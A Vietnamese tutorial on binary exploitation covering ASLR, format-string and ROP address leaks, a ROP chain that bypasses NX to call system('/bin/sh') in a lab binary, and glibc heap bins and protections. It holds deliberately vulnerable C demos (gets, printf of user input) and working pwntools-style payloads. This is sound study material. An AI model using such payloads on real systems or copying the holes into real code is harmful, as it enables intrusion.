# Giai đoạn nâng cao

## Bypas ASLR

#### Cách ASLR hoạt động

- ASLR (Address space layout randomization) là sự sắp xếp ngẫu nhiên địa chỉ của chương trình, thư viện, stack và heap. Mục đích để ngăn chặn các kĩ thuật tấn công stack, heap và libc.
- Vậy làm sao hệ thống có thể random? Việc randomized memory address được kernel thực thi, đây là source code [`/mm/util.c`](https://github.com/torvalds/linux/blob/master/mm/util.c#L368):

```c
#define PAGE_SHIFT	12
/**
 * randomize_page - Generate a random, page aligned address
 * @start:	The smallest acceptable address the caller will take.
 * @range:	The size of the area, starting at @start, within which the
 *		random address must fall.
 *
 * If @start + @range would overflow, @range is capped.
 *
 * NOTE: Historical use of randomize_range, which this replaces, presumed that
 * @start was already page aligned.  We now align it regardless.
 *
 * Return: A page aligned address within [start, start + range).  On error,
 * @start is returned.
 */
unsigned long
randomize_page(unsigned long start, unsigned long range)
{
	if (!PAGE_ALIGNED(start)) {
		range -= PAGE_ALIGN(start) - start;
		start = PAGE_ALIGN(start);
	}

	if (start > ULONG_MAX - range)
		range = ULONG_MAX - start;

	range >>= PAGE_SHIFT;

	if (range == 0)
		return start;

	return start + (get_random_long() % range << PAGE_SHIFT);
}
```

- Một cách dễ hiểu thì hệ thống sẽ random địa chỉ `start`, tính range và trả về `base address` sau khi dịch trái lại 12 bit. Vậy em có nhận xét rằng, base address sẽ có dạng 0x?????????????000 (64 bit) và 0x?????000 (32 bit)
- Sau khi có base address, hệ thống sẽ cộng địa chỉ của chương trình khi chưa ASLR (offset) vào base address. Ví dụ địa chỉ hàm main trước khi ASLR (offset) là 0x1122 và `base address` là 0x55555000 = địa chỉ hàm main sau ASLR là 0x55556122

```
- Tóm lại, trong linux, sau khi compile, mỗi hàm sẽ có cho mình một địa chỉ offset.
- Khi thực thi, kernel sẽ random base address, hệ thống sẽ lấy base + offset = địa chỉ chương trình
- Vùng nhớ bss, heap, libc, stack là các vùng nhớ khác nhau và có mỗi địa chỉ base của riêng vùng nhớ đó
```

### Sử dụng các kỹ thuật như leak địa chỉ bộ nhớ

#### Sử dụng kỹ thuật format string để leak

- Mục tiêu để bypass được ASLR là ta biết được một địa chỉ trong chương trình, sau đó tính ra `base address` của vùng nhớ đó. Demo một bug format string dùng để leak

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int main()
{
    setbuf(stdin, 0);
    setbuf(stderr, 0);
    setbuf(stdout, 0);
    char buf[100];
    fgets(buf, 50, stdin);
    printf(buf);
}
```

![](/assets/readme/2024-11-11-15-42-57.png)

- Như vậy kết hợp kỹ thuật format string để leak cùng với các kỹ thuật khá ta có thể RCE.

#### Sử dụng kỹ thuật ROP để leak

- Ở kĩ thuật này chúng ta sử dụng các gadget để có thể leak địa chỉ. Thông thường, chúng ta sử dụng puts để leak. Lý do vì hàm puts nhận một tham số là một địa chỉ, sẽ dễ dàng hơn trong việc setup hơn.

  ![](/assets/readme/2024-11-11-16-02-00.png)

- Trong 64 bit thì tham số đầu tiên là `rdi`, 32 bit thì tham số đầu tiên là `ebx`
- Vậy hướng khai thác sẽ là sử dụng `pop rdi` (để lấy địa chỉ đầu stack vào thanh ghi `rdi`), thì mục tiêu ta sẽ đưa lên thanh rdi một địa chỉ mà trỏ đến một địa chỉ khác (ví dụ libc).

  ![](/assets/readme/2024-11-11-16-23-32.png)

- Để hiểu hơn về kỹ thuật, em sẽ demo một bài `target là leak địa chỉ libc`

```c
#include <stdio.h>
int hint()
{
    asm("pop %rdi\n");
    asm("ret");
}
int main()
{
    puts("hi there\n");

    char buffer[40];
    gets(buffer);


    return 0;
}
```

- Ta thấy có Buffer Overflow ta hoàn toàn có thể ROP để điều khiển luồng thực thi.
- Ở đây khi debug và dừng chương trình trước khi ret e có nhận xét sau:

```
Chương trình sẽ pop rdi và lấy từ stack ra là puts@got đang trỏ đến địa chỉ libc và puts@plt sẽ thực thi nó
```

![](/assets/readme/2024-11-11-16-29-18.png)

- Trước khi pop

![](/assets/readme/2024-11-11-16-32-30.png)

- Kết quả: Giá trị leak ra là địa chỉ puts trong libc bắt đầu bằng 0x7f và kết thúc là 0x40

![](/assets/readme/2024-11-11-16-32-57.png)

#### Sử dụng kỹ thuật brute force

- Kỹ thuật này không thể leak như ROP, tuy nhiên trong một số trường hợp ta có thể brute force address base. Đối với 32 bit thì ổn khi ta cần brute 2.5 byte

---

## Bypass DEP

### DEP/NX là gì và cách DEP hoạt động

- DEP (hay NX) là một tính năng phần cứng được hỗ trợ bởi nhiều kiến trúc CPU (như x86 và x86_64)
- Mục đích của DEP/NX là ngăn chặn việc thực thi mã không tin cậy (shellcode) bằng cách cấp quyền đọc, ghi và thực thi (rwx)
- Chi tiết hơn thì khi chạy chương trình, chương trình được tải vào bộ nhớ, kernel sẽ thiết lập các trang bộ nhớ cho chương trình đó và chỉ định các quyền truy cập. Thông thường, các vùng chứ các đoạn code sau compile sẽ được cấp quyền r-x, và các vùng nhớ khác như BSS, stack, heap được cấp rw-

#### Bypass DEP/NX bằng ROP

- NX chỉ ngăn chặn thực thi các shellcode trong các vùng nhớ. Ta có thể sử dụng ROP để bypass và tạo luồng thực thi mới.
- Để hiểu hơn em sẽ demo một bài.
- Source code và các lớp bảo vệ:

```c
#include <stdio.h>
int hint()
{
    asm("pop %rdi\n");
    asm("ret");
}
int main()
{
    puts("hi there\n");

    char buffer[40];
    gets(buffer);

    return 0;
}
```

![](/assets/readme/2024-11-12-10-06-23.png)

- Em thấy có NX bật nên em sẽ tìm cách bypass NX bằng cách sử dụng ROP, đầu tiên em sử dụng kĩ thuật ROP để leak address nhằm bypass ASLR (em đã đề cập ở phần trên). Payload em sử dụng để leak:
- Em có sử thêm địa chỉ main vào sau khi leak với mục đích nó sẽ trở về hàm main để em có thể overflow tiếp

```python
pop_rdi = 0x000000000040113a
puts_got = 0x404000
puts_plt = 0x401030
main = 0x000000000040113f
pa = b'a'*56 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
sla(b'there\n\n', pa)
libc_base = u64(p.recvline(keepends=False) + b'\0\0')
print(f"{hex(libc_base) = }")
```

- Kết quả sau khi leak:

![](/assets/readme/2024-11-12-10-14-47.png)

- Tiếp đến em tính địa chỉ libc_base, hàm system và chuỗi /bin/sh nhằm mục đích chuẩn bị RCE

```python
libc_base = leak - 0x77640
system = libc_base + 0x4dab0
binsh = libc_base + 0x197e34
print(f"{hex(libc_base) = }")
print(f"{hex(system) = }")
print(f"{hex(binsh) = }")
```

- Hàm system tương tự như puts cũng sử dụng 1 tham số là rdi để hoạt đồng

```python
pa = b'a'*56 + p64(pop_rdi+1)+p64(pop_rdi) + p64(binsh) + p64(system)
sla(b'there\n\n', pa)
```

- Kết quả

![](/assets/readme/2024-11-12-10-37-44.png)

## ROP (Return-Oriented Programming)

### ROP là gì và được dùng khi nào?

- ROP là kỹ thuật sử dụng các đoạn chương trình nhỏ(gadget) ghép lại với nhau tạo thành một luồng thực thi tuỳ ý attacker.
- ROP thường được sử dụng khi có bug overflow, chúng ta sẽ sắp xếp các gadget ở dưới để khi kết thúc luồng thực thi chính sẽ thực thi các gadget đó.
- ROP có thể được dùng leak để bypass ASLR, bypass DEP và chúng ta sẽ nhắm đến các libc mã nguồn mở như thư viện của hệ điều hành vì chúng có các gadget mà ta cần.

### Cách tạo chuỗi ROP để thực hiện tấn công

- Thông thường, em sẽ chọn hàm mình cần trước, ví dụ muốn leak hoặc get shell em sẽ dùng đến thanh rdi, nếu muốn open một file nào đó thì em sử dụng rdi và rsi. Nghĩa là tuỳ thuộc vào hàm mình sử dụng cần những tham số nào vào sau đó tìm các gadget liên quan đến thanh ghi đó.
- Ưu tiên là nên tìm những gadget nhỏ, dễ sử dụng trước.

### Một số lab sử dụng ROP để bypass leak

- [rop2shell (easy)](/task1_giai-doan-nang-cao/bypass-dep/rop2shell.c)
- [syslooper (hard)](https://github.com/OfficialCyberSpace/CSCTF-2024/tree/main/pwn/syslooper)

## Advanced Heap Exploitation

### Hiểu về các cơ chế hoạt động của heap

#### Một số lý thuyết

- Bộ nhớ heap là một vùng bộ nhớ được sử dụng để cấp phát động trong chương trình máy tính. Điều này có nghĩa là nó có thể cấp phát một lượng bộ nhớ không biết trước được tại thời điểm biên dịch. Heap thường được sử dụng để cấp phát bộ nhớ cho các đối tượng động được tạo ra trong khi chương trình đang chạy, chẳng hạn như các biến, mảng và cấu trúc dữ liệu.
- Một chunk heap khi được malloc như sau:

![](/assets/readme/2024-11-12-11-23-42.png)

- Một số lý thuyết về các bin

##### Fast bin

- Gồm 7 danh sách liên kết, được đánh số và có kích thước tương ứng

```
────────────────────── Fastbins for arena 0x7ffff7dd1b20 ──────────────────────
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)
Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x602050, size=0x30, flags=PREV_INUSE)
Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602080, size=0x40, flags=PREV_INUSE)
Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x6020c0, size=0x50, flags=PREV_INUSE)
Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x602110, size=0x60, flags=PREV_INUSE)
Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x602170, size=0x70, flags=PREV_INUSE)
Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x6021e0, size=0x80, flags=PREV_INUSE)
```

- Ví dụ, chunk 1 có size là 0x30, nó sẽ được đưa vào fast bin và gán index là 2
- Fast bin được tổ chức theo cơ chế LIFO tương tự như stack.
- Ví dụ chunk 0x80 được đưa vào, rồi đến chunk 0x20 thì chunk 0x20 phải được đưa ra trước thì mới có thể đưa chunk 0x80 ra

##### tcache

- Thùng tcache tương tự như thùng nhanh (Fast Bins), nhưng có những khác biệt, hoạt động như stack.
- Thùng tcache là một cơ chế phân chia mới được giới thiệu trong phiên bản libc 2.26 (trước đó, bạn sẽ không thấy thùng tcache). Thùng tcache là đặc thù của từng luồng (thread), vì vậy mỗi luồng đều có một thùng tcache riêng của nó.
- Trong các phiên bản libc có thùng tcache, thùng tcache là nơi đầu tiên mà malloc sẽ tìm để phân bổ khối hoặc để đặt các khối được giải phóng vào (vì nó nhanh hơn).
- Khi một khối được giải phóng trong một luồng, nó sẽ được chèn vào thùng tcache của luồng đó thay vì chèn vào fast bin chung. Khi một luồng cần phân bổ một khối mới, nó sẽ tìm kiếm trước trong thùng tcache của chính nó để kiểm tra xem có khối nào đủ kích thước để sử dụng hay không. Việc tìm kiếm này nhanh hơn so với việc tìm kiếm trong thùng fast bin vì không cần phải đồng bộ hóa giữa các luồng.

##### Unsorted, Large and Small Bins

- Các bin Small, Large và Unsorted được liên kết chặt chẽ hơn với nhau trong cách thức hoạt động của chúng hơn các bin khác. Các bin Unsorted, Large và Small đều được lưu trữ trong cùng một mảng. Mỗi bin có các chỉ mục khác nhau trỏ đến mảng này:

```
0x00:         Not Used
0x01:         Unsorted Bin
0x02 - 0x3f:  Small Bin
0x40 - 0x7e:  Large Bin
```

- Có một danh sách cho Unsorted Bin, 62 danh sách cho Small Bin và 63 danh sách cho Large Bin.
- Các khối bộ nhớ trong Unsorted Bin không được sắp xếp theo kích thước, mà được lưu trữ trong một danh sách liên kết đơn. Hệ thống sẽ kiểm tra Unsorted Bin trước tiên để tìm kiếm bất kỳ khối bộ nhớ nào có thể
- Khi hệ thống kiểm tra Unsorted Bin, nó cũng sẽ kiểm tra xem có khối bộ nhớ nào có thể thuộc về các danh sách khác như Small Bin hoặc Large Bin hay không.
- Tương tự như fast bin, 62 danh sách của Small Bin và 63 danh sách của Large Bin được chia thành nhiều phần theo kích thước. Các Small Bin trên x64 bao gồm các kích thước khối nhỏ hơn 0x400 (1024 byte), và trên x86 bao gồm các kích thước khối nhỏ hơn 0x200 (512 byte), trong khi large bin bao gồm các khối bộ nhớ có kích thước lớn hơn các giá trị trên đó.

##### So sánh

|                | Unsorted bin                                                                                                                                                                                                                                       | Large bin                                                                                                                                                                                                                       | Small bin                                                                                                                                                                                                                      |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Ưu điểm**    | Thời gian giải phóng khối bộ nhớ nhanh hơn so với các bin khác do không cần sắp xếp lại khối bộ nhớ theo kích thước. Thích hợp cho các khối bộ nhớ có kích thước ngẫu nhiên.                                                                       | Thời gian phân bổ bộ nhớ nhanh hơn so với small bin do chỉ cần tìm kiếm trong danh sách large bin. Giảm thiểu fragmentation bộ nhớ bằng cách giữ các khối bộ nhớ lớn hơn một giá trị ngưỡng nhất định trong cùng một danh sách. | Thời gian phân bổ bộ nhớ nhanh hơn so với large bin do chỉ cần tìm kiếm trong danh sách small bin.Giảm thiểu fragmentation bộ nhớ bằng cách giữ các khối bộ nhớ nhỏ hơn giá trị ngưỡng của large bin trong cùng một danh sách. |
| **Nhược điểm** | Thời gian phân bổ bộ nhớ chậm hơn so với các bin khác do phải tìm kiếm trong danh sách unsorted bin trước. Có thể dẫn đến fragmentation bộ nhớ nếu các khối bộ nhớ được giải phóng và phân bổ liên tục không có giải phóng khối bộ nhớ giữa chúng. | Thời gian giải phóng khối bộ nhớ chậm hơn so với small bin do phải duyệt danh sách liên kết đôi. Có thể dẫn đến wasting space nếu các khối bộ nhớ lớn không được sử dụng hết.                                                   | Thời gian giải phóng khối bộ nhớ chậm hơn so với large bin do phải duyệt danh sách liên kết đơn. Có thể dẫn đến wasting space nếu các khối bộ nhớ nhỏ không được sử dụng hết.                                                  |

#### Một số cơ chế bảo vệ

##### Safe-Linking

- Ở các phiên bản cũ, khi free một chunk vào bin, chunk đó sẽ lưu địa chỉ của chunk trong bin trước đó. Ví dụ

```
Fast bin:
CHUNK A -> 0
Sau khi free CHUNK B
CHUNK B -> CHUNK A -> 0
```

- Tuy nhiên, ở phiên bản mới địa chỉ của CHUNK A sẽ bị encrypt trước khi lưu vào CHUNK B
- Source code:

```c
#define PROTECT_PTR(pos, ptr, type)  \
        ((type)((((size_t)pos) >> PAGE_SHIFT) ^ ((size_t)ptr)))
#define REVEAL_PTR(pos, ptr, type)   \
        PROTECT_PTR(pos, ptr, type)
```

##### Double free detected

- Ở các phiên bản libc mới thì khi free một chunk vào bin, chương trình sẽ kiểm tra trong bin có chunk đó chưa.
- Source code:

```c
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache_key))
	  {
	    tcache_entry *tmp;
	    size_t cnt = 0;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx]; tmp;
		 tmp = REVEAL_PTR (tmp->next), ++cnt)
	      {
		if (cnt >= mp_.tcache_count)
		  malloc_printerr (
		      "free(): too many chunks detected in tcache");
		if (__glibc_unlikely (!aligned_OK (tmp)))
		  malloc_printerr (
		      "free(): unaligned chunk detected in tcache 2");
		if (tmp == e)
		  malloc_printerr ("free(): double free detected in tcache 2");
		/* If we get here, it was a coincidence.  We've wasted a
		   few cycles, but don't abort.  */
	      }
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
      }
  }
#endif
```

##### Một số cơ chế bảo vệ khác
[security_checks](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks)
##### Một số kỹ thuật nâng cao
[heap](/task1_giai-doan-nang-cao/heap.md)